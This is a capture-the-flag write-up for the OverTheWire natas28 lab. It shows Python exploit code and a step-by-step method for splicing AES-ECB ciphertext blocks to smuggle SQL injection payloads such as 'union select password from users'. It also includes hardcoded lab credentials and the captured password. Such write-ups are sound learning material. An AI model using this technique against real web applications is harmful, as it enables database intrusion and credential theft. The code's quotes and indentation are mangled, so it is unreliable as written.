# natas29

Chosen-plaintext attack in AES-ECB mode and SQL injection

```python
import httplib,sys,binascii
from base64 import b64encode,b64decode
from urllib import quote,unquote

def check(query):
query=quote(query)
httpClient = None
try:
userAndPass = b64encode(b”natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF”).decode(“ascii”)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’}
httpClient = httplib.HTTPConnection(‘natas28.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?query=’+query, headers=headers)
response = httpClient.getresponse()
#responseData = response.read()
result = response.getheader(‘Location’)
return binascii.b2a_hex(b64decode(unquote(result[result.find(‘query=’)+6:])))
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def outputhex(str):
i=0
newStr=”
for c in str:
i+=1
if i%32==0:
newStr+=c+’ ‘
else:
newStr+=c
print newStr

def xorInside(str1,str2):
first=str1.decode(‘hex’)
second=str2.decode(‘hex’)
newStr=”
for i in range(0,16):
newStr+= chr(ord(first[i])^ord(second[i]))
return binascii.b2a_hex(newStr)

def autocheck():
a=”
b=”
for i in range(1,80):
a+=’a’
b+=’b’
outputhex(check(a))
outputhex(check(b))

autocheck()
```

Query process:

1.Message = Escape(Original_input)
2.Message_to_encrypt = Prefix[38] | Message | Suffix[30] | Padding(PKCS#7?)
3.Encrypted_message = AES-ECB(Message_to_encrypt)
4.Message_to_send = Base_64(Encrypted_message) 5.http://natas28.natas.labs.overthewire.org/search.php/index.php?query=Message_to_send

How to get a “‘ or 1=1 — “:

1. query “aaaaaaaaaa”+”x or 1=1 — bbbb”+”aa” (a,b and x can be any normal char)
   1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 c0872dee8bc90b1156913b08a223a39e 2915fe89fae53f38df4c947acd65adde ce82a9553b65b81280fb6d3bf2900f47 75fd5044fd063d26f6bb7f734b41c899
2. query “aaaaaaaaa” +”‘ or 1=1 — bbbb”+”aa”
   1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 11dbb80ae02425dc9726bffd1803160e 42094fd365d8e79ba6bbbe58b962416b ce82a9553b65b81280fb6d3bf2900f47 75fd5044fd063d26f6bb7f734b41c899
   since ‘ is replaced to \’, I removed one “a” in the left string to make the \ be in the same group of the nine “a”. The new message is
   Prefix[32] | Prefix[6] + “aaaaaaaaa” + “\” | “‘ or 1=1 — bbbb” | “aa” + Suffix[30] (No padding because the last group is full)
   As a result, the encryption of “‘ or 1=1 — bbbb” is 42094fd365d8e79ba6bbbe58b962416b
3. place it as the fourth group in the first query instead of the previous one, base64 the result and send it

---

1. try “‘ union select 1 from users — ” (“aaaaaaaaa”+”‘ union select 1″+” from users — b”+”bbbbbbbbbbbbbbbb”+”aa”)
   return 1, which means that the table “users” exists
2. try “‘ union select password from users — ” (“aaaaaaaaa”+”‘ union select p”+”assword from use”+”rs — bbbbbbbbbb”+”aa”)
   got the password!

```python
import httplib,sys,binascii
from base64 import b64encode,b64decode
from urllib import quote,unquote

def check(query):
query=quote(query)
httpClient = None
try:
userAndPass = b64encode(b”natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF”).decode(“ascii”)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’}
httpClient = httplib.HTTPConnection(‘natas28.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?query=’+query, headers=headers)
response = httpClient.getresponse()
#responseData = response.read()
result = response.getheader(‘Location’)
return binascii.b2a_hex(b64decode(unquote(result[result.find(‘query=’)+6:])))
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def outputhex(str):
i=0
newStr=”
for c in str:
i+=1
if i%32==0:
newStr+=c+’ ‘
else:
newStr+=c
print newStr
print “<br/>”

def xorInside(str1,str2):
first=str1.decode(‘hex’)
second=str2.decode(‘hex’)
newStr=”
for i in range(0,16):
newStr+= chr(ord(first[i])^ord(second[i]))
return binascii.b2a_hex(newStr)

def autocheck():
a=”
b=”
for i in range(1,80):
a+=’a’
b+=’b’
outputhex(check(a))
outputhex(check(b))

#sql=”aaaaaaaaa”+”‘ or 1=1 — bbbb”+”bbbbbbbbbbbbbbbb”+”bbbbbbbbbbbbbbbb”+”aa”
#sql= “aaaaaaaaa”+”‘ union select 1″+” from users — b”+”bbbbbbbbbbbbbbbb”+”aa”
sql= “aaaaaaaaa”+”‘ union select p”+”assword from use”+”rs — bbbbbbbbbb”+”aa”

print binascii.b2a_hex(sql)
outputhex(check(sql))

sqlinj=check(sql)
sqlinj =’1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e’

#sqlinj+=’42094fd365d8e79ba6bbbe58b962416b’+’88a7bd72cda247dae1c3219f054b2e60’+’88a7bd72cda247dae1c3219f054b2e60′
#sqlinj+=’9ae5ffe4df58364079bd3029586df0d6’+’2730431c345fce894d727ac6b56a6762’+’88a7bd72cda247dae1c3219f054b2e60′
sqlinj+= ‘f89dd8dbec15c6a6d9993a3dc7b7a308’+’86951754f7ad56454eb5d5b6768ee646’+’b65a5da3890587484e1107767874df16’

sqlinj+=’ce82a9553b65b81280fb6d3bf2900f4775fd5044fd063d26f6bb7f734b41c899′
print quote(b64encode(sqlinj.decode(‘hex’)))

#autocheck()
```

Password: airooCaiseiyee8he8xongien9euhe8b
